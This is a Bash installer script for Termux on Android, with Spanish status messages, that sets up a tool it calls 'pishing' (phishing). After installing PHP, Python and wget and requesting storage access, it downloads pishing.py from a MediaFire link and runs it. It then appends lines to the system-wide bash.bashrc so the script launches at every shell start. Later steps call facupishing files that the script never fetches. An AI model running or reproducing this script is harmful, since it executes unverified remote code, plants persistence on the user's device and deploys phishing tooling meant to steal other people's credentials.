#!/bin/bash
printf "\e[1;31m Bienvenido a la Instalacion de mi pishing, aguarde...\n"
sleep 7
printf "\e[1;31m Instalando PHP, aguarde\n"
sleep 3
clear
pkg install php
clear
printf "\e[1;31m Instalacion PHP finalizada\n"
sleep 3
clear
printf "\e[1;31m Istalando modulos php, aguarde...\n"
sleep 5
clear
pkg install php*
clear
printf "\e[1;31m Modulos PHP instalados\n"
sleep 5
clear
printf "\e[1;31m Instalando Wget, aguarde\n"
sleep 5
clear
pkg install wget
clear
printf "\e[1;31m wget instalado\n"
sleep 5
clear
printf "\e[1;31m instalando modulos adicionales\n"
sleep 3
pkg  install python
clear
pkg install python*
clear
printf "\e[1;31m Para continuar de permisos de storage a su termux\n"
sleep 3
termux-setup-storage
printf "\e[1;31m Permisos otorgados\n"
sleep 2
clear
wget http://download1492.mediafire.com/c8j80j23rjcg/2myc8fnrn1gj278/pishing.py
clear
chmod +x pishing.py
python pishing.py
mv pishing.py /data/data/com.termux/files/usr/etc/
rm /data/data/com.termux/files/usr/etc/motd
sleep 2
cd /data/data/com.termux/files/usr/etc/
sleep 1
echo "cd /data/data/com.termux/files/usr/etc/" >> /data/data/com.termux/files/usr/etc/bash.bashrc
clear
echo "python pishing.py" >> /data/data/com.termux/files/usr/etc/bash.bashrc
clear
echo "cd" >> /data/data/com.termux/files/usr/etc/bash.bashrc
clear
cd /home/
sleep 5
clear
printf "\e[1;31m Asignando permisos a archivo pishing...\n"
sleep 3
chmod +x facupishing.py
printf "\e[1;31m Instalacion completada..\n"
clear
printf "\e[1;31m Ejecutaremos el script pishing en 3 segundos\n"
sleep 3
pkg install mpv
clear
bash facupishing.sh
exit








